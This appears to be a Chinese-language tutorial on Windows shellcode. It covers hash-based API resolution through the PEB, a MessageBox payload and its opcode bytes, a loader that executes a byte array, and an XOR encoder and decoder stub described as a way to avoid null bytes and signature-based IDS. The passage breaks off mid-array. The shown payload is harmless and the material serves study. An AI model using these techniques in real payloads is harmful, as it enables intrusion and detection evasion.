class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">_asm&#123;</span><br><span class="line">CLD 						;clear flag DF</span><br><span class="line"></span><br><span class="line">;store hash</span><br><span class="line">push 0x1e380a6a 			;hash of MessageBoxA</span><br><span class="line">push 0x4fd18963 			;hash of ExitProcess</span><br><span class="line">push 0x0c917432 			;hash of LoadLibraryA</span><br><span class="line">mov esi,esp 				;esi = addr of first function hash</span><br><span class="line">lea edi,[esi-0xc] 			;edi = addr to start writing function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;make some stack space</span><br><span class="line">xor ebx,ebx</span><br><span class="line">mov bh, 0x04</span><br><span class="line">sub esp, ebx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;push a pointer to &quot;user32&quot; onto stack</span><br><span class="line">mov bx, 0x3233 				;rest of ebx is null</span><br><span class="line">push ebx</span><br><span class="line">push 0x72657375</span><br><span class="line">push esp</span><br><span class="line">xor edx,edx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;find base addr of kernel32.dll</span><br><span class="line">mov ebx, fs:[edx + 0x30]	;ebx = address of PEB</span><br><span class="line">mov ecx, [ebx + 0x0c] 		;ecx = pointer to loader data</span><br><span class="line">mov ecx, [ecx + 0x1c]		;ecx = first entry in initialization</span><br><span class="line">							;order list</span><br><span class="line">mov ecx, [ecx] 				;ecx = second entry in list</span><br><span class="line">							;(kernel32.dll)</span><br><span class="line">mov ebp, [ecx + 0x08] ;ebp = base address of kernel32.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find_lib_functions:</span><br><span class="line">lodsd 						;load next hash into al and increment esi</span><br><span class="line">cmp eax, 0x1e380a6a 		;hash of MessageBoxA - trigger</span><br><span class="line">							;LoadLibrary(&quot;user32&quot;)</span><br><span class="line">jne find_functions</span><br><span class="line">xchg eax, ebp 				;save current hash</span><br><span class="line">call [edi - 0x8] 			;LoadLibraryA</span><br><span class="line">xchg eax, ebp 				;restore current hash, and update ebp</span><br><span class="line">							;with base address of user32.dll\</span><br><span class="line">					</span><br><span class="line"></span><br><span class="line">					</span><br><span class="line">find_functions:</span><br><span class="line">pushad 						;preserve registers</span><br><span class="line">mov eax, [ebp + 0x3c] 		;eax = start of PE header</span><br><span class="line">mov ecx, [ebp + eax + 0x78] ;ecx = relative offset of export table</span><br><span class="line">add ecx, ebp 				;ecx = absolute addr of export table</span><br><span class="line">mov ebx, [ecx + 0x20] 		;ebx = relative offset of names table</span><br><span class="line">add ebx, ebp 				;ebx = absolute addr of names table</span><br><span class="line">xor edi, edi 				;edi will count through the functions</span><br><span class="line"></span><br><span class="line">next_function_loop:</span><br><span class="line">inc edi 					;increment function counter</span><br><span class="line">mov esi, [ebx + edi * 4] 	;esi = relative offset of current</span><br><span class="line">							;function name</span><br><span class="line">add esi, ebp 				;esi = absolute addr of current</span><br><span class="line">							;function name</span><br><span class="line">cdq 						;dl will hold hash (we know eax is</span><br><span class="line">							;small)</span><br><span class="line"></span><br><span class="line">							</span><br><span class="line">							</span><br><span class="line">hash_loop:</span><br><span class="line">movsx eax, byte ptr[esi]</span><br><span class="line">cmp al,ah</span><br><span class="line">jz compare_hash</span><br><span class="line">ror edx,7</span><br><span class="line">add edx,eax</span><br><span class="line">inc esi</span><br><span class="line">jmp hash_loop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">compare_hash:	</span><br><span class="line">cmp edx, [esp + 0x1c] 		;compare to the requested hash (saved on</span><br><span class="line">							;stack from pushad)</span><br><span class="line">jnz next_function_loop</span><br><span class="line"></span><br><span class="line">mov ebx, [ecx + 0x24] 		;ebx = relative offset of ordinals</span><br><span class="line">							;table</span><br><span class="line">add ebx, ebp ;ebx = absolute addr of ordinals</span><br><span class="line">							;table</span><br><span class="line">mov di, [ebx + 2 * edi] 	;di = ordinal number of matched</span><br><span class="line">							;function</span><br><span class="line">mov ebx, [ecx + 0x1c] 		;ebx = relative offset of address</span><br><span class="line">							;table</span><br><span class="line">add ebx, ebp 				;ebx = absolute addr of address table</span><br><span class="line">add ebp, [ebx + 4 * edi] 	;add to ebp (base addr of module) the</span><br><span class="line">							;relative offset of matched function</span><br><span class="line">xchg eax, ebp 				;move func addr into eax</span><br><span class="line">pop edi 					;edi is last onto stack in pushad</span><br><span class="line">stosd 						;write function addr to [edi] and</span><br><span class="line">							;increment edi</span><br><span class="line">push edi</span><br><span class="line">popad 						;restore registers</span><br><span class="line">							;loop until we reach end of last hash</span><br><span class="line">cmp eax,0x1e380a6a</span><br><span class="line">jne find_lib_functions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function_call:</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx 					;cut string</span><br><span class="line">push 0x74736577</span><br><span class="line">push 0x6C696166 			;push failwest</span><br><span class="line">mov eax,esp 				;load address of failwest</span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">call [edi - 0x04] 			;call MessageboxA</span><br><span class="line">push ebx</span><br><span class="line">call [edi - 0x08] 			;call ExitProcess</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上面代码可以用vs编译出可执行文件 然后用OD中提取的二进制汇编代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x90&quot;// 					NOP</span><br><span class="line">&quot;\xFC&quot;// 					CLD</span><br><span class="line">&quot;\x68\x6A\x0A\x38\x1E&quot;// 	PUSH 1E380A6A</span><br><span class="line">&quot;\x68\x63\x89\xD1\x4F&quot;// 	PUSH 4FD18963</span><br><span class="line">&quot;\x68\x32\x74\x91\x0C&quot;// 	PUSH 0C917432</span><br><span class="line">&quot;\x8B\xF4&quot;// 				MOV ESI,ESP</span><br><span class="line">&quot;\x8D\x7E\xF4&quot;// 			LEA EDI,DWORD PTR DS:[ESI-C]</span><br><span class="line">&quot;\x33\xDB&quot;// 				XOR EBX,EBX</span><br><span class="line">&quot;\xB7\x04&quot;// 				MOV BH,4</span><br><span class="line">&quot;\x2B\xE3&quot;// 				SUB ESP,EBX</span><br><span class="line">&quot;\x66\xBB\x33\x32&quot;// 		MOV BX,3233</span><br><span class="line">&quot;\x53&quot;// 					PUSH EBX</span><br><span class="line">&quot;\x68\x75\x73\x65\x72&quot;// 	PUSH 72657375</span><br><span class="line">&quot;\x54&quot;// 					PUSH ESP</span><br><span class="line">&quot;\x33\xD2&quot;// 				XOR EDX,EDX</span><br><span class="line">&quot;\x64\x8B\x5A\x30&quot;// 		MOV EBX,DWORD PTR FS:[EDX+30]</span><br><span class="line">&quot;\x8B\x4B\x0C&quot;// 			MOV ECX,DWORD PTR DS:[EBX+C]</span><br><span class="line">&quot;\x8B\x49\x1C&quot;// 			MOV ECX,DWORD PTR DS:[ECX+1C]</span><br><span class="line">&quot;\x8B\x09&quot;// 				MOV ECX,DWORD PTR DS:[ECX]</span><br><span class="line">&quot;\x8B\x69\x08&quot;// 			MOV EBP,DWORD PTR DS:[ECX+8]</span><br><span class="line">&quot;\xAD&quot;// 					LODS DWORD PTR DS:[ESI]</span><br><span class="line">&quot;\x3D\x6A\x0A\x38\x1E&quot;// 	CMP EAX,1E380A6A</span><br><span class="line">&quot;\x75\x05&quot;// 				JNZ SHORT popup_co.00401070</span><br><span class="line">&quot;\x95&quot;// 					XCHG EAX,EBP</span><br><span class="line">&quot;\xFF\x57\xF8&quot;// 			CALL DWORD PTR DS:[EDI-8]</span><br><span class="line">&quot;\x95&quot;// 					XCHG EAX,EBP</span><br><span class="line">&quot;\x60&quot;// 					PUSHAD</span><br><span class="line">&quot;\x8B\x45\x3C&quot;// 			MOV EAX,DWORD PTR SS:[EBP+3C]</span><br><span class="line">&quot;\x8B\x4C\x05\x78&quot;// 		MOV ECX,DWORD PTR SS:[EBP+EAX+78]</span><br><span class="line">&quot;\x03\xCD&quot;// 				ADD ECX,EBP</span><br><span class="line">&quot;\x8B\x59\x20&quot;// 			MOV EBX,DWORD PTR DS:[ECX+20]</span><br><span class="line">&quot;\x03\xDD&quot;// 				ADD EBX,EBP</span><br><span class="line">&quot;\x33\xFF&quot;// 				XOR EDI,EDI</span><br><span class="line">&quot;\x47&quot;//	 				INC EDI</span><br><span class="line">&quot;\x8B\x34\xBB&quot;// 			MOV ESI,DWORD PTR DS:[EBX+EDI*4]</span><br><span class="line">&quot;\x03\xF5&quot;// 				ADD ESI,EBP</span><br><span class="line">&quot;\x99&quot;// 					CDQ</span><br><span class="line">&quot;\x0F\xBE\x06&quot;// 			MOVSX EAX,BYTE PTR DS:[ESI]</span><br><span class="line">&quot;\x3A\xC4&quot;// 				CMP AL,AH</span><br><span class="line">&quot;\x74\x08&quot;// 				JE SHORT popup_co.00401097</span><br><span class="line">&quot;\xC1\xCA\x07&quot;// 			ROR EDX,7</span><br><span class="line">&quot;\x03\xD0&quot;// 				ADD EDX,EAX</span><br><span class="line">&quot;\x46&quot;// 					INC ESI</span><br><span class="line">&quot;\xEB\xF1&quot;// 				JMP SHORT popup_co.00401088</span><br><span class="line">&quot;\x3B\x54\x24\x1C&quot;// 		CMP EDX,DWORD PTR SS:[ESP+1C]</span><br><span class="line">&quot;\x75\xE4&quot;// 				JNZ SHORT popup_co.00401081</span><br><span class="line">&quot;\x8B\x59\x24&quot;// 			MOV EBX,DWORD PTR DS:[ECX+24]</span><br><span class="line">&quot;\x03\xDD&quot;// 				ADD EBX,EBP</span><br><span class="line">&quot;\x66\x8B\x3C\x7B&quot;// 		MOV DI,WORD PTR DS:[EBX+EDI*2]</span><br><span class="line">&quot;\x8B\x59\x1C&quot;// 			MOV EBX,DWORD PTR DS:[ECX+1C]</span><br><span class="line">&quot;\x03\xDD&quot;// 				ADD EBX,EBP</span><br><span class="line">&quot;\x03\x2C\xBB&quot;// 			ADD EBP,DWORD PTR DS:[EBX+EDI*4]</span><br><span class="line">&quot;\x95&quot;// 					XCHG EAX,EBP</span><br><span class="line">&quot;\x5F&quot;// 					POP EDI</span><br><span class="line">&quot;\xAB&quot;// 					STOS DWORD PTR ES:[EDI]</span><br><span class="line">&quot;\x57&quot;// 					PUSH EDI</span><br><span class="line">&quot;\x61&quot;// 					POPAD</span><br><span class="line">&quot;\x3D\x6A\x0A\x38\x1E&quot;// 	CMP EAX,1E380A6A</span><br><span class="line">&quot;\x75\xA9&quot;// 				JNZ SHORT popup_co.00401063</span><br><span class="line">&quot;\x33\xDB&quot;// 				XOR EBX,EBX</span><br><span class="line">&quot;\x53&quot;// 					PUSH EBX</span><br><span class="line">&quot;\x68\x77\x65\x73\x74&quot;// 	PUSH 74736577</span><br><span class="line">&quot;\x68\x66\x61\x69\x6C&quot;// 	PUSH 6C696166</span><br><span class="line">&quot;\x8B\xC4&quot;// 				MOV EAX,ESP</span><br><span class="line">&quot;\x53&quot;// 					PUSH EBX</span><br><span class="line">&quot;\x50&quot;// 					PUSH EAX</span><br><span class="line">&quot;\x50&quot;// 					PUSH EAX</span><br><span class="line">&quot;\x53&quot;// 					PUSH EBX</span><br><span class="line">&quot;\xFF\x57\xFC&quot;// 			CALL DWORD PTR DS:[EDI-4]</span><br><span class="line">&quot;\x53&quot;// 					PUSH EBX</span><br><span class="line">&quot;\xFF\x57\xF8&quot;;// 			CALL DWORD PTR DS:[EDI-8]</span><br></pre></td></tr></table></figure></p>
<p>上面被保存在字符数组的shellcode已经可以轻易的在exploit程序中运行了 也可用shellcodde装载程序单独使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">char popup_general[]=</span><br><span class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span><br><span class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span><br><span class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span><br><span class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span><br><span class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span><br><span class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span><br><span class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span><br><span class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span><br><span class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span><br><span class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span><br><span class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		lea eax, popup_general</span><br><span class="line">		push eax</span><br><span class="line">		ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这样就可以在所有的win_32平台下运行了</p>
<h1 id="shellcode-编码技术"><a href="#shellcode-编码技术" class="headerlink" title="shellcode 编码技术"></a>shellcode 编码技术</h1><h2 id="为什么要对shellcode-编码"><a href="#为什么要对shellcode-编码" class="headerlink" title="为什么要对shellcode 编码"></a>为什么要对shellcode 编码</h2><p>因为有些场景不适用<br>首先，所有的字符串函数都会对NULL 字节进行限制。通常我们需要选择特殊的指令来避免在shellcode 中直接出现NULL 字节（byte，ASCII 函数）或字（word，Unicode 函数）。</p>
<p>其次，有些函数还会要求shellcode 必须为可见字符的ASCII 值或Unicode 值。在这种限制较多的情况下，如果仍然通过挑选指令的办法控制shellcode 的值的话，将会给开发带来很大困难。</p>
<p>最后，除了以上提到的软件自身的限制之外，在进行网络攻击时，基于特征的IDS 系统往往也会对常见的shellcode 进行拦截。</p>
<p>所以就要用到编码了 我们先编码成程序能够接受的 然后读取进去之后 我们再用几行代码进行解码就行</p>
<h2 id="会“变形”的shellcode"><a href="#会“变形”的shellcode" class="headerlink" title="会“变形”的shellcode"></a>会“变形”的shellcode</h2><p>下面进行编码运算 最简单的编码就是异或运算了 而我们需要注意的是：<br>􀁺 用于异或的特定数据相当于加密算法的密钥，在选取时不可与shellcode 已有字节相同，否则编码后会产生NULL 字节。</p>
<p>􀁺 可以选用多个密钥分别对shellcode 的不同区域进行编码，但会增加解码操作的复杂性。</p>
<p>􀁺 可以对shellcode 进行很多轮编码运算。<br>编码器代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">void encoder (char* input, unsigned char key, int display_flag)// bool</span><br><span class="line">display_flag</span><br><span class="line">&#123;</span><br><span class="line">	int i=0,len=0;</span><br><span class="line">	FILE * fp;</span><br><span class="line">	unsigned char * output;</span><br><span class="line">	len = strlen(input);</span><br><span class="line">	output=(unsigned char *)malloc(len+1);</span><br><span class="line">	if(!output)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;memory erro!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	//encode the shellcode</span><br><span class="line">	for(i=0;i&lt;len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		output[i] = input[i]^key;</span><br><span class="line">	&#125;</span><br><span class="line">	if(!(fp=fopen(&quot;encode.txt&quot;,&quot;w+&quot;)))</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;output file create erro&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	fprintf(fp,&quot;\&quot;&quot;);</span><br><span class="line">	for(i=0;i&lt;len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		fprintf(fp,&quot;\\x%0.2x&quot;, output[i]);</span><br><span class="line">		if((i+1)%16==0)</span><br><span class="line">		&#123;</span><br><span class="line">			fprintf(fp,&quot;\&quot;\n\&quot;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fprintf(fp,&quot;\&quot;;&quot;);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	printf(&quot;dump the encoded shellcode to encode.txt OK!\n&quot;);</span><br><span class="line">	if(display_flag)//print to screen</span><br><span class="line">	&#123;</span><br><span class="line">		for(i=0;i&lt;len;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;%0.2x &quot;,output[i]);</span><br><span class="line">			if((i+1)%16==0)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;\n&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	free(output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>encoder（）函数会使用传入的key 参数对输入的数据逐一异或，并将其整理成十六进制的形式dump 进一个名为encode.txt 的文件中。这里对第四节中的通用shellcode 进行编码，密钥采用0x44，在main 中直接调用encoder(popup_general,0x44 ,1)，会得到经过编码的shellcode如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48&quot;</span><br><span class="line">&quot;\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17&quot;</span><br><span class="line">&quot;\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf&quot;</span><br><span class="line">&quot;\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1&quot;</span><br><span class="line">&quot;\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d&quot;</span><br><span class="line">&quot;\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47\xb1\xdd\x4b\xfa\x42\x7e&quot;</span><br><span class="line">&quot;\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31&quot;</span><br><span class="line">&quot;\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47&quot;</span><br><span class="line">&quot;\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x77\x9f&quot;</span><br><span class="line">&quot;\x17\x2c\x33\x21\x37\x30\x2c\x22\x25\x2d\x28\xcf\x80\x17\x14\x14&quot;</span><br><span class="line">&quot;\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4&quot;;</span><br></pre></td></tr></table></figure>
<p>对于解码 我们可以用以下几条指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		add eax, 0x14 //越过decoder，记录shellcode 的起始地址</span><br><span class="line">		xor ecx,ecx</span><br><span class="line">		decode_loop:</span><br><span class="line">		mov bl,[eax+ecx]</span><br><span class="line">		xor bl, 0x44 //这里用0x44 作为key，如编码的key 改变，这里也要相应改变</span><br><span class="line">		mov [eax+ecx],bl</span><br><span class="line">		inc ecx</span><br><span class="line">		cmp bl,0x90 //在shellcode 末尾放上一个字节的0x90 作为结束符</span><br><span class="line">		jne decode_loop</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对于这个解码器，有以下需要注意的地方。<br>（1）解码器不能单独运行，需要用VC 6.0 将其编译，然后用OllyDbg 提取出二进制的机器代码，联合经过编码的shellcode 一起执行。</p>
<p>（2）解码器默认在shellcode 开始执行时，EAX 已经对准了shellcode 的起始位置。</p>
<p>（3）解码器将认为shellcode 的最后一个字节为0x90，所以在编码前要注意给原始shellcode多加一个字节的0x90 作为结尾，否则会产生错误。</p>
<table>
<thead>
<tr>
<th style="text-align:center">机器代码</th>
<th style="text-align:center">汇编指令</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">“\x83\xC0\x14”</td>
<td style="text-align:center">ADD EAX,14 h</td>
<td style="text-align:center">跃过decoder 代码区</td>
</tr>
<tr>
<td style="text-align:center">“\x33\xC9”</td>
<td style="text-align:center">XOR ECX,ECX</td>
<td style="text-align:center">ECX 被当作循环控制变量</td>
</tr>
<tr>
<td style="text-align:center">“\x8A\x1C\x08”</td>
<td style="text-align:center">MOV BL, [EAX+ECX]</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">“\x80\xF3\x44”</td>
<td style="text-align:center">XOR BL,44 h</td>
<td style="text-align:center">这里key=0x44，如果encode 使用新key，这里需要做相应的修改</td>
</tr>
<tr>
<td style="text-align:center">“\x88\x1C\x08”</td>
<td style="text-align:center">MOV[EAX+ECX],BL</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">“\x41”</td>
<td style="text-align:center">INC ECX</td>
</tr>
<tr>
<td style="text-align:center">“\x80\xFB\x90”</td>
<td style="text-align:center">CMP BL,90 h</td>
<td style="text-align:center">将0x90 作为shellcode 结束的标识符</td>
</tr>
<tr>
<td style="text-align:center">“\x75\xF1”</td>
<td style="text-align:center">JNZ</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>最后 将这20个字节的编码指令与经过编码的shellcode一起送入装载器测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">char final_sc_44[]=</span><br><span class="line">&quot;\x83\xC0\x14&quot; //ADD EAX,14H</span><br><span class="line">&quot;\x33\xC9&quot; //XOR ECX,ECX</span><br><span class="line">&quot;\x8A\x1C\x08&quot; //MOV BL,BYTE PTR DS:[EAX+ECX]</span><br><span class="line">&quot;\x80\xF3\x44&quot; //XOR BL,44H</span><br><span class="line">//notice 0x44 is taken as temp key to decode !</span><br><span class="line">&quot;\x88\x1C\x08&quot; //MOV BYTE PTR DS:[EAX+ECX],BL</span><br><span class="line">&quot;\x41&quot; //INC ECX</span><br><span class="line">&quot;\x80\xFB\x90&quot; //CMP BL,90H</span><br><span class="line">&quot;\x75\xF1&quot; //JNZ SHORT decoder.00401034</span><br><span class="line">&quot;\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48&quot;</span><br><span 